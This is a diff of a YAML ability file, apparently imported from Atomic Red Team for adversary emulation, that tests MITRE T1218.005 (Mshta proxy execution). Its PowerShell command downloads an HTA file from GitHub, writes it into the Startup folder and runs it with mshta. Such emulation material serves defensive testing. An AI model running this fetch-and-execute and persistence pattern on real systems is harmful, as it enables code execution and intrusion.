@@ -4,15 +4,16 @@
   tactic: stealth
   technique:
     attack_id: T1218.005
-    name: 'Signed Binary Proxy Execution: Mshta'
+    name: 'System Binary Proxy Execution: Mshta'
   platforms:
     windows:
       psh:
-        command: $var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta";
-          $var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta";
-          mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta";
-          start-sleep -s 15; stop-process -name "calculator" -Force -ErrorAction Ignore;
-          stop-process -name "CalculatorApp" -Force -ErrorAction Ignore
+        command: $var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
+          -UseBasicParsing; $var.content|out-file "$env:appdata\Microsoft\Windows\Start
+          Menu\Programs\Startup\T1218.005.hta"; mshta "$env:appdata\Microsoft\Windows\Start
+          Menu\Programs\Startup\T1218.005.hta"; start-sleep -s 15; stop-process -name
+          "calculator" -Force -ErrorAction Ignore; stop-process -name "CalculatorApp"
+          -Force -ErrorAction Ignore
         cleanup: remove-item "#{temp_file}" -ErrorAction Ignore
   plugin: atomic
   singleton: false
@@ -20,9 +21,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
-  - t1218.005
   - stealth
+  - t1218.005
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -36,4 +37,4 @@
         default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
     technique_created: '2020-01-23T19:32:49.557Z'
     atomic_guid: c4b97eeb-5249-4455-a607-59f95485cb45
-    import_timestamp: '2026-10-20T07:08:26.679751Z'
+    import_timestamp: '2026-10-21T07:01:49.452081Z'
